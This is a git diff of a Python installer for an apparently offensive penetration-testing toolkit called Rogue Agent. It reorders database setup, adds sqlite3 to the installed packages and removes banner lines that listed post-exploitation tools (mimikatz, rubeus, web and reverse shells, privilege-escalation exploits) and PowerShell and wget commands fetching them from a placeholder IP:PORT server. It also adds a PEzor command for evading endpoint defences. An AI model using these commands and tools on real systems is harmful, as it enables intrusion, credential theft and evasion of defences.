@@ -36,7 +36,7 @@ if os.geteuid() != 0:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Define system colours
+# Details : Define temporary system colours
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -48,7 +48,7 @@ Reset  = '\e[0m'
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Display product banner
+# Details : Display rogue-agent product banner
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -83,37 +83,6 @@ for x in range(0, len(dirList)):
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Create program database and tables
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-conn = sqlite3.connect('ROGUEAGENT/config.db')
-
-conn.execute('''CREATE TABLE REMOTETARGET
-         (IDS INT PRIMARY KEY	NOT NULL,
-         COM		TEXT	NOT NULL,
-         DNS		TEXT	NOT NULL,
-         TIP		TEXT	NOT NULL,
-         PTS		TEXT	NOT NULL,
-         WEB		TEXT	NOT NULL,
-         USR		TEXT	NOT NULL,
-         PAS		TEXT	NOT NULL,
-         NTM		TEXT	NOT NULL,
-         TGT		TEXT	NOT NULL,
-         DOM		TEXT	NOT NULL,
-         SID		TEXT	NOT NULL,
-         TSH		TEXT	NOT NULL);''')
-         
-conn.execute("INSERT INTO REMOTETARGET (IDS,COM,DNS,TIP,PTS,WEB,USR,PAS,NTM,TGT,DOM,SID,TSH) \
-      VALUES (1, 'UNKNOWN', 'EMPTY', 'EMPTY', 'EMPTY', 'EMPTY', '""', '""', 'EMPTY', 'EMPTY', 'EMPTY', 'EMPTY', 'EMPTY' )");
-      
-conn.commit()
-conn.close()
-
-# -------------------------------------------------------------------------------------
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
 # Details : Create program banners
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -134,28 +103,6 @@ with open("banner2.txt", "w") as banner:
    banner.write("\t\t\t\t\t\t| |_| | | |   | | | |_) | \___ \|  _| | |_) \ \ / /|  _| | |_) |            \n")
    banner.write("\t\t\t\t\t\t|  _  | | |   | | |  __/   ___) | |___|  _ < \ V / | |___|  _ <             \n")
    banner.write("\t\t\t\t\t\t|_| |_| |_|   |_| |_|     |____/|_____|_| \_\ \_/  |_____|_| \_\            \n")
-   banner.write("\t\t\t\t\t\t                                                                          \n\n")   
-   banner.write("ENUMERATION\t\tSHELLS\t\t\tRUNNING PROCESSES\t\tCOMMUNICATIONS\t\t\tCORE EXPLOITS       \n")
-   banner.write("---------------------------------------------------------------------------------------------------------------------------------------------------------\n")
-   banner.write("Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted                    \n")
-   banner.write("powershell 'iwr -Uri http://IP:PORT/TREADSTONE/filename' -outfile filename              \n")
-   banner.write("---------------------------------------------------------------------------------------------------------------------------------------------------------\n")
-   banner.write("jawsenum.ps1\t\twinshell32.exe\t\tpowerup.ps1\t\t\tnc64.exe\t\t\tmimidump.ps1           \n")
-   banner.write("sharphound.ps1\t\twinshell64.exe\t\tpowercat.ps\t\t\tplink64.exe\t\t\tmimikatz.ps1      \n")
-   banner.write("sharphound.exe\t\twebshell.php\t\tpowerview.ps1\t\t\twin_chisel64.exe\t\twinpwn.ps1     \n")
-   banner.write("winpeas32.exe\t\tmyshell.jpg\t\tpowermad.ps1\t\t\twin_chisel32.exe\t\tlovelypotato.ps1  \n")
-   banner.write("winpeas64.exe\t\t\t\t\tprocdump32.exe\t\t\ttest_clsid.bat\t\t\troguepotato.exe          \n")
-   banner.write("rubeus.exe\t\t\t\t\tprocdump64.exe\t\t\trogueoxidresolver.exet\t\tmimikatz64.exe        \n")
-   banner.write("nmapsetup.exe\t\t\t\t\t\t\t\t\t\t\t\t\tmimikatz32.exe                                   \n")   
-   banner.write("---------------------------------------------------------------------------------------------------------------------------------------------------------\n")
-   banner.write("wget 'http://IP:PORT/TREADSTONE/fileame                                                 \n")
-   banner.write("---------------------------------------------------------------------------------------------------------------------------------------------------------\n")
-   banner.write("coffee.sh\t\tlinshell32.elf\t\tpspy32\t\t\t\tlin_chisel64\t\t\tnaughtycowcompile.sh     \n")
-   banner.write("linpeas.sh\t\tlineshell64.elf\t\tpspy64\t\t\t\tlin_chisel32\t\t\tnaughycow.c            \n")
-   banner.write("linenum.sh                                                                              \n")
-   banner.write("linenumplus.sh                                                                          \n")
-   banner.write("linpe.sh                                                                                \n")
-   banner.write("---------------------------------------------------------------------------------------------------------------------------------------------------------\n")
 
 with open("banner3.txt", "w") as banner:
    banner.write("\t\t\t\t\t\t ____  __  __ ____    ____  _____ ______     _______ ____                   \n") 
@@ -163,7 +110,6 @@ with open("banner3.txt", "w") as banner:
    banner.write("\t\t\t\t\t\t\___ \| |\/| |  _ \  \___ \|  _| | |_) \ \ / /|  _| | |_) |                 \n")
    banner.write("\t\t\t\t\t\t ___) | |  | | |_) |  ___) | |___|  _ < \ V / | |___|  _ <                  \n")
    banner.write("\t\t\t\t\t\t|____/|_|  |_|____/  |____/|_____|_| \_\ \_/  |_____|_| \_\                 \n")
-   banner.write("\t\t\t\t\t\t                                                                          \n\n")
 
 with open("banner4.txt", "w") as banner:
    banner.write("\t\t\t\t\t\t __  __ _____ _____ _____ ____  ____  ____  _____ _____ _____ ____         \n")
@@ -179,7 +125,6 @@ with open("banner5.txt", "w") as banner:
    banner.write("\t\t\t\t\t\t| |  _| | | |  \| |  _|   | |_) | |_| || |\___ \| |_| || ||  \| | |  _     \n")
    banner.write("\t\t\t\t\t\t| |_| | |_| | |\  | |___  |  __/|  _  || | ___) |  _  || || |\  | |_| |    \n")
    banner.write("\t\t\t\t\t\t \____|\___/|_| \_|_____| |_|   |_| |_|___|____/|_| |_|___|_| \_|\____|    \n")
-   banner.write("\t\t\t\t\t\t                                                                         \n\n")
 
 os.chdir("..")
 
@@ -193,7 +138,7 @@ os.chdir("..")
 
 print("[*] Installing system requirements, please wait...")
 
-list1 = ["bloodhound", "hashcat", "python3-pip", "python3-ldap", "gobuster", "crackmapexec", "exiftool", "rlwrap", "xdotool", "seclists"]
+list1 = ["sqlite3", "bloodhound", "hashcat", "python3-pip", "python3-ldap", "gobuster", "crackmapexec", "exiftool", "rlwrap", "xdotool", "seclists"]
 
 for x in range(0, len(list1)):
    os.system("apt-get install " + list1[x] + " -y >> log.txt 2>&1")
@@ -218,11 +163,44 @@ if not os.path.exists("/usr/share/doc/python3-impacket/examples/windapsearch.py"
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
+# Details : Create program database and tables
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+print("[*] Creating program database, please wait...")
+
+conn = sqlite3.connect('ROGUEAGENT/config.db')
+
+conn.execute('''CREATE TABLE REMOTETARGET
+         (IDS INT PRIMARY KEY	NOT NULL,
+         COM		TEXT	NOT NULL,
+         DNS		TEXT	NOT NULL,
+         TIP		TEXT	NOT NULL,
+         PTS		TEXT	NOT NULL,
+         WEB		TEXT	NOT NULL,
+         USR		TEXT	NOT NULL,
+         PAS		TEXT	NOT NULL,
+         NTM		TEXT	NOT NULL,
+         TGT		TEXT	NOT NULL,
+         DOM		TEXT	NOT NULL,
+         SID		TEXT	NOT NULL,
+         TSH		TEXT	NOT NULL);''')
+         
+conn.execute("INSERT INTO REMOTETARGET (IDS,COM,DNS,TIP,PTS,WEB,USR,PAS,NTM,TGT,DOM,SID,TSH) \
+      VALUES (1, 'UNKNOWN', 'EMPTY', 'EMPTY', 'EMPTY', 'EMPTY', '\"\"', '\"\"', 'EMPTY', 'EMPTY', 'EMPTY', 'EMPTY', 'EMPTY' )");
+      
+conn.commit()
+conn.close()
+
+# -------------------------------------------------------------------------------------
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
 # Details : Install windows and linux exploits
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-print("[*] Installing windows and linux exploits, please wait...")   
+print("[*] Installing windows/linux exploits, please wait...")   
 
 os.chdir("TREADSTONE")
 
@@ -324,11 +302,7 @@ os.system("git clone https://github.com/phra/PEzor.git >> log.txt 2>&1")
 
 os.chdir("PEzor")
 os.system("bash install.sh >> keepme.txt 2>&1")
-
-path = open("keepme.txt", "r")
-last_line = path.readlines()[-1]
-path.close()
-os.system(last_line)
+os.system("echo 'Use command = ./Pezor -unhook -syscall -sgn executable' >> keepme.txt")
 
 os.chdir("..")
 os.chdir("..")
